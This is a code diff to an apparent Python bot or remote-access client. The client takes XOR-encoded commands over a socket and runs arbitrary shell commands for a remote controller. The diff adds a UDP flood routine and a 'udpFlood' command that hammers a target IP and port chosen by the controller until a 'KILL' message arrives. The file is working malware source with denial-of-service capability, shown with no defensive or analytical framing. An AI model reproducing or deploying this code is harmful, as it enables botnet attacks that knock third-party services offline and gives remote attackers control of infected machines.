@@ -4,6 +4,7 @@ import socket
 import subprocess
 import sys
 from time import sleep
+import multiprocessing
 
 def make_en_STDOUT(STDOUT):
     if STDOUT:
@@ -34,6 +35,11 @@ def make_en_bin_data(data):
     for i in range(len(en_data)):
         en_data[i] ^=0x41
     return en_data
+
+def UDP_Flood(target_IP, target_Port,msg):
+    flood_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while True:
+        flood_sock.sendto(bytes(msg), (target_IP,target_Port))
 
 def main():
     try:
@@ -168,6 +174,22 @@ def main():
                 s.send(en_STDOUT)
             except:
                 sys.exit()
+        elif en_data == "udpFlood":
+            data = s.recv(1024)
+            en_data = make_en_data(data)
+            en_data = en_data.split(":")
+            targetIP = en_data[0]
+            targetPort = int(en_data[1])
+            data = s.recv(1024)
+            en_data = make_en_data(data)
+            p = multiprocessing.Process(target=UDP_Flood, args=(targetIP,targetPort,en_data))
+            p.start()
+            while True:
+                data = s.recv(1024)
+                en_data = make_en_data(data)
+                if en_data == "KILL":
+                    p.terminate()
+                    break
         else:
             comm = subprocess.Popen(en_data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             STDOUT,STDERR = comm.communicate()
